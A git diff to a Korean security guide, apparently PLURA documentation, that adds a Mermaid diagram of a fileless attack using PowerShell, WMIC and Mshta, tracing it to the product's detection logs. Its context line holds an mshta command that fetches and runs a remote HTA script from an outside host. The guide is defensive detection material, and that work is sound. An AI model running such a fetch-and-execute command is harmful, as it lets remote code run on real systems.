@@ -130,3 +130,16 @@ mshta http://ethanlabs.shop/MALSCRIPT.hta
 - **PowerShell, WMIC, Mshta**는 Windows 내 강력한 스크립트 실행 도구로 파일리스 공격을 수행하는 데 자주 사용됩니다.
 - 공격자는 디스크에 파일을 저장하지 않고 메모리 내에서 바로 실행하여 탐지 회피를 시도합니다.
 - 위 과정을 통해 PLURA의 탐지 기능과 보안 로그를 확인하세요.
+
+# 공격 개요 (Mermaid Diagram)
+
+```mermaid
+graph TD
+    A[공격 서버] -->|MALSCRIPT 전달| B[피해 서버]
+    B -->|PowerShell 실행| C[파일 삭제 수행]
+    B -->|WMIC 실행| D[명령 수행]
+    B -->|Mshta 실행| E[HTA 파일 실행]
+    C -->|결과 확인| F[PLURA 탐지 내역]
+    D -->|결과 확인| F[PLURA 탐지 내역]
+    E -->|결과 확인| F[PLURA 탐지 내역]
+```
